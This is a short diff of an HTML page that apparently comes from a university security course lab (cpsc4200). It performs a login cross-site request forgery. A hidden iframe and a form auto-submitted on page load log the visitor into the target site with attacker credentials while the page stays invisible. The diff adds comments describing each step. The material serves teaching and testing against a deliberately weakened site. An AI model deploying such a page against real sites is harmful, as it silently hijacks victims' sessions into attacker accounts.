@@ -2,6 +2,8 @@
 <html lang="en">
   <body>
     <iframe name="hiddenFrame" style="display:none" aria-hidden="true"></iframe>
+    <!-- Form for post request to the login page using attacker information -->
+    <!-- Uses the hidden iframe as its target so that it is invisible -->
     <form name="f" method="post" 
       action="http://cpsc4200.mpese.com/login?csrfdefense=0&xssdefense=4"
       target="hiddenFrame">
@@ -9,8 +11,11 @@
       <input id="userpass" name="password" type="hidden" value="l33th4x">
     </form>
     <script>
+      // make sure the page is blank
       document.documentElement.style.visibility = 'hidden';
+      // submit the request
       document.f.submit();
     </script>
   </body>
 </html>
+
